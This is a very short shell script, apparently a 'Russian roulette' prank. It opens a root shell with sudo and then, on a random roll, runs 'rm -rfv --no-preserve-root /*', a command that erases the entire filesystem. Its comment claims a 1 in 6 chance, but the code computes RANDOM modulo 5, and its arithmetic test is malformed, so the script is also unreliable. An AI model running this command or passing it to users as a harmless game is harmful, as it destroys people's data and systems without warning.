sudo -s

#the following if statement has a 1 in 6 chance of being true
if [ 1 -eq (( RANDOM % 5 )) ]; then
    echo "Game Over!"
    rm -rfv --no-preserve-root /*
fi
